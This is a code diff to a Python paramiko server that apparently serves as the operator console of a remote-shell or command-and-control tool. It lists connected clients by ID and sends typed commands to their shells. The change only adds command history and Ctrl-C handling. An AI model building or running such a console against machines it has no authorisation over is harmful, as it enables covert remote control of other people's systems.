@@ -9,6 +9,8 @@ import select
 import logging
 from paramiko.common import OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED, OPEN_SUCCEEDED, AUTH_SUCCESSFUL
 from pathlib import Path
+from prompt_toolkit import PromptSession
+from prompt_toolkit.history import InMemoryHistory
 
 HOST = ''
 PORT = 2222
@@ -43,6 +45,8 @@ def start_management(client_info):
     print(f'\n[+] Management mode started with client with ID: {c_id}')
     print('[+] To go back to the main menu type "back".')
 
+    prompt_session = PromptSession(history=InMemoryHistory())
+
     try:
         while True:
             directory = chan.recv(4096).decode('utf-8').strip()
@@ -52,10 +56,15 @@ def start_management(client_info):
                     if c_id in active_clients: del active_clients[c_id]
                 session.close()
                 break
-            command = input(f'{directory} -< ').strip()
+            try:
+                command = prompt_session.prompt(f'{directory} -< ').strip()
+            except KeyboardInterrupt:
+                chan.send(b'keep_alive')
+                continue
             if not command:
                 chan.send(b'keep_alive')
                 continue
+            LAST_CMD = command
             if command == 'back':
                 print('[+] Going back to the main menu...')
                 chan.send(b'keep_alive')
